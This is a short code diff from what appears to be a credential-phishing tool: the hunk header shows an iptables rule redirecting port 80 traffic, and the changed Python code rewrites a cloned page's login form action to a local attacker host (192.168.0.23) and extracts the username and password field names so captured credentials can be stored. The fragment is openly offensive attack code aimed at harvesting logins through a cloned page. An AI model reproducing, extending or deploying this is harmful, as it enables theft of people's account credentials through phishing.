@@ -1321,12 +1321,16 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
             new_post_action = regex.sub('action="/login.php"',html_source)          # Replaces action variable with ours e.g <action="http://192.168.0.23/login.php">
 
-            for forms in enumerate(regex_post.findall(new_post_action)):
-                pos = new_post_action.index(forms[1])
-                new_string = new_post_action[pos:-1]
+            combinations =  re.findall("(<input[\w\s=\"-]+>)",html_source)
+            for index,combination in enumerate(combinations):
+                if(re.findall("type='?\"password'?\"",combination)):
+                    username_tag =  combinations[index - 1]
+                    password_tag = combinations[index]
 
-                for login_form in regex_post_process.findall(new_string):
-                    form_login_variables.append(login_form)
+                    username = re.findall("name=\"(\S+)\"",username_tag)[0]
+                    password = re.findall("name=\"(\S+)\"",password_tag)[0]
+
+                    form_login_variables = [username,password]
 
             self.form_variables = form_login_variables       # Store to database, website form variables e.g ['email','pass']
 
